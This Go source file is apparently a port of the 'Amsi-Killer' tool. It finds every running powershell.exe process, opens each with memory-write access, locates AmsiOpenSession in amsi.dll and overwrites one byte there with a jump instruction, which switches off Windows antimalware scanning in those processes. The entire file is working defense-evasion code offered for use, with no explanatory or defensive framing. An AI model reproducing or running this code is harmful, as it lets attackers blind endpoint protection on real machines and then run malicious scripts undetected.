package main

import (
	"fmt"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows"
	"unsafe"
)

const (
	PROCESS_VM_OPERATION = 0x0008
	PROCESS_VM_READ      = 0x0010
	PROCESS_VM_WRITE     = 0x0020
)

func patchAmsi(pid uint32) {
	patch := byte(0xEB)

	hHandle, err := windows.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE, false, pid)
	if err == nil {
		fmt.Printf("[+] Process opened with Handle -> %v\n", hHandle)
	}

	amsiDLL, err := windows.LoadLibrary("amsi.dll")
	if err == nil {
		fmt.Printf("[+] amsi.dll located at -> %v\n", amsiDLL)
	}

	amsiOpenSession, err := windows.GetProcAddress(amsiDLL, "AmsiOpenSession")
	if err == nil {
		fmt.Printf("[+] AmsiOpenSession located at -> %v\n", amsiOpenSession)
	}

	patchAddr := amsiOpenSession + uintptr(3)

	fmt.Printf("[+] Trying to patch -> %v\n", patchAddr)

	var bytesWritten uintptr
	err = windows.WriteProcessMemory(hHandle, patchAddr, (*byte)(unsafe.Pointer(&patch)), 1, &bytesWritten)
	if err == nil {
		fmt.Printf("[+] Process memory patched :)\n")
	}
}

func patchAllPowershells() {
	processes, _ := process.Processes()

	for _, proc := range processes {
		name, err := proc.Name()
		if err == nil && name == "powershell.exe" {
			pid := proc.Pid
			fmt.Printf("\n--------------------------------------------\n")
			fmt.Printf("[!] Patching process powershell.exe with pid -> %d\n", pid)
			patchAmsi(uint32(pid))
		}
	}
}

func main() {
	fmt.Printf("Amsi-Killer port made in Golang with love <3")
	patchAllPowershells()
	fmt.Scanln()
}
